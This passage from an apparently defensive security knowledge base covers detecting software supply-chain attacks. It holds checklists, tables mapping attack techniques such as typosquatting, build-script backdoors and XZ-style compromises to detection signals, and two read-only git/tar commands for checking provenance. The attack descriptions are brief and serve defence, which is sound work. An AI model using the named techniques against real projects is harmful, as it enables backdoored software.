- [ ] Code signing with Sigstore/cosign — guarantee the integrity of build artifacts
- [ ] Use dependency lockfiles (package-lock.json, requirements.txt, Cargo.lock)

### 7.3 Detection

- [ ] Alert when binary files are added to test/ or data/ directories
- [ ] Require enhanced review for changes to build scripts (.m4, Makefile, setup.py)
- [ ] Runtime behavioral analysis (eBPF-based tools: Falco, Tetragon)
- [ ] Automate SBOM generation and vulnerability scanning
- [ ] Pin dependency versions and verify hashes

### 7.4 Attack Technique Detection Summary

| Attack Technique | Detection Method |
|-----------------|-----------------|
| Typosquatting | Package name similarity check; review all new dependency additions |
| Dependency confusion | Pre-register internal package names on public registries; pin versions |
| Compromised maintainer | Enforce 2FA; require multiple approvals; alert on anomalous releases |
| Trojan Source | Grep for Unicode control characters; configure editor visualization |
| Build script backdoor | Compare tarball vs git diff; enhanced review on build script changes |
| CI/CD poisoning | SHA-pin all Actions; avoid pull_request_target with code checkout |
| XZ-style | Check liblzma IFUNC resolvers; reproducible builds; alert on binary test files |
| SolarWinds-style | Isolate build environments; sign and verify build artifacts; SLSA compliance |

<!-- detect-validate-35 -->
## Open-Source Backdoor Detection and Change-Provenance Validation

Open-source backdoors hide malicious code from the source via *trust-then-malicious-commit, GHA workflow poisoning, build-stage obfuscation, and compiler backdoors ("Trusting Trust")*. Defenders must verify **whether release artifacts are reproducibly built from reviewed source**. Validate only on **owned repos/builds**.

### Attack -> Targeted weakness -> Primary control (defender) -> Detection signal

| Technique | Targeted weakness | Primary control (defender) | Detection signal |
|---|---|---|---|
| Trust then backdoor | Maintainer trust | Multi-review, signed commits | Solo merge, unsigned commit |
| Build-stage obfuscation | Artifact != source | Reproducible build | Build-output diff |
| GHA workflow poisoning | CI mutates source | Review/pin workflows | Source patched during build |
| Compiler backdoor | Trusted toolchain | Bootstrap, diverse compile | Same source, different binary |

### Defense validation (verify directly)

```bash
# 1) Whether the release tarball matches git source (source<->artifact diff) — added/altered files signal a backdoor
diff -r <(git archive HEAD | tar -t | sort) <(tar -tzf dist-release.tgz | sed 's#^[^/]*/##' | sort) 2>/dev/null | head
# 2) Unsigned/solo-merge commit surface (owned repo) — review-bypass backdoor path
git log --no-merges --pretty='%h %G? %an %s' -20 | grep -vE ' [GU] ' | head
```

> Open-source defense is *whether artifacts came from reviewed source* -- "it builds" differs from "the tarball matches git source, commits are signed/reviewed, and the build is reproducible". Confirm change provenance on owned repos/builds directly ([[74_Code_Auditing]], [[18_DevSecOps]], [[59_Supply_Chain_Security]]).
